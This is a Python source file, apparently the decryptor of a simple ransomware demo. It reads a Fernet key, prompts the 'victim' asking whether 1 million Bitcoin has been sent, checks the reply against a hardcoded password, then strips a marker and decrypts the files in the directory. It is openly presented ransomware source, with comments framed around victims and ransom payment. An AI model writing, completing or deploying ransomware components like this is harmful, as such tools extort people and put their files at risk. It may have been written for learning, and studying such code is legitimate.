import os

#allows us to use regular expressions to specify a single/group of chars in a string
import re

#necessary for encryption/decryption
from cryptography.fernet import Fernet

#a variable that will store file names of the victim's files
victims_files = []

#a for loop that will list each file in the victim's directory
for file in os.listdir():

        #an exception so that the encryption/decryption does not affect the specified files
        if file == "ransomware.py" or file == "thekey.key" or file == "decode.py":
                continue

        #verify that a file is indeed a file and not a directory such as folders or directories.
        if os.path.isfile(file):
                victims_files.append(file)

#print the list of victim's files
#print(victims_files)

#read the contents of the key
with open("thekey.key", "rb") as thekey:
        secretkey = thekey.read()

#a password for the victim to decrypt their files after they paid
secretPass = "paidinfull"
#prompt victim for the secretPass
secretAccess = input("Have you sent 1 million Bitcoin?")

#a condition assuring the victim entered the correct password
if secretAccess == secretPass:
        #create a for loop to examine and modify each file in the directory
        for file in victims_files:

                #read the contents of the victim's files in normal read mode ("r"), as opposed to read in binary ("rb")
                with open(file, "r") as thefile:
                        raw_contents = thefile.read()
                #we need the normal read mode so that regex can discern and remove the tag (" Hello") from the encrypted content
                with open(file, "w") as thefile:
                        #regex specifies any single/string of chars that ends with " hello". 
                        # $ implies the end of a string.        
                        regex = r" hello$"
                        mark_removed = re.sub(regex, "", raw_contents)
                        thefile.write(mark_removed)

                #open each file and store its info inside the variable contents
                with open(file, "rb") as thefile:
                        contents = thefile.read()
        
                #use the key to decrypt the contents
                decrypt_contents = Fernet(secretkey).decrypt(contents)

                #overwrite the contents of each file using the encrypted version
                with open(file, "wb") as thefile:
                        thefile.write(decrypt_contents)

else:
        print("Send 1 million Bitcoins fool!")